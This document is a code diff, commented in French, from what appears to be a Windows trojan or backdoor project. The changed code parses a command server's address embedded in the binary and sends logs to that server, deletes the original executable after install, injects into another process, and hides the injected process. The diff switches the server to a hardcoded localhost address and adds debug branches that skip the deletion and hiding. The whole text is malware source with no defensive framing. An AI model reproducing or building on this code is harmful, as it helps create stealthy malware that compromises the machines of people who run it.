@@ -46,7 +46,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     // les informations de connexions vers le serveur se trouvent dans une chaine de 
     // caractere avec un certain format située dans l'exécutable
 	// on va parser les infos de connexions à partir de la chaine
-    string buffer = connection_infos;
+    /*
+	string buffer = blaspheme;
     string ip_str;
     string port_str;
     buffer = buffer.substr(MARKER_SIZE, buffer.size()-2*MARKER_SIZE);
@@ -57,6 +58,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     from_string(port_str, port);
     
     LOG.addObserver(new Common::LoggingNetwork(ip_str, port));
+	*/
+	LOG.addObserver(new Common::LoggingNetwork("127.0.0.1", 80));
     InhibiterCore injector (thisProcess.getProgramPath());
     LOG << "Programme : " + thisProcess.getProgramPath();
     LOG << "Nombre d'arguments : " + to_string(thisProcess.getArgCount());
@@ -101,22 +104,24 @@ void ExecuteCommand(InhibiterCore& injector, const string& command)
     {
 	    LOG << "Finalisation installation / Injecteur.";
         Sleep(300);
-        LOG << "Effacement de l'ancien executable : " + command;
 #ifndef INNOCENCE_DEBUG
+		LOG << "Effacement de l'ancien executable : " + command;
         if(!DeleteFile(command.c_str()))
         {
 			LOG << "Error code : " + to_string(GetLastError());
             FATAL_ERROR("Impossible d'effacer l'executable lors de l'installation");
         }
         else
+#else
+		 LOG << "En mode debug, pas d'effacement de l'ancien executable";
 #endif
         {
 			LOG << "Injection...";
 			injector.inject();
 #ifndef INNOCENCE_DEBUG
+			LOG << "Camouflage du processus injecte.";
 			try
 			{
-				LOG << "Camouflage du processus injecte.";
 				ProcessHider hider;
 				hider.hide(injector.getInjectedProcess());
 			}
@@ -128,6 +133,8 @@ void ExecuteCommand(InhibiterCore& injector, const string& command)
 			{
 				LOG << "Erreur d'origine inconnue.";
 			}
+#else
+			LOG << "Pas de camouflage de processus en mode debug";
 #endif
 		}
     }
